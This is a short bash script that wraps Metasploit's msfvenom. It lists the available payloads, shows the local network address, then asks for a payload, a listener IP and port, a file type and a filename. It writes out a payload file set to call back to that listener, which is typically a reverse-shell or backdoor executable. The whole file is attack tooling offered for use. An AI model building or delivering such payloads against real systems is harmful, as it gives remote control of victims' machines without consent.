#!/bin/bash
echo "select your paylaod"
msfvenom -l payloads 

echo "paste your payload"

read payload

ifconfig 

echo "please enter your ip add" 

read ip

echo "please enter  your port"
 
read port


echo "Enter your filetype extension"

read extension

echo "enter filename that you want to save"

read filename

msfvenom LHOST=$ip LPORT=$port $payload -f $extension > $filename.$extension
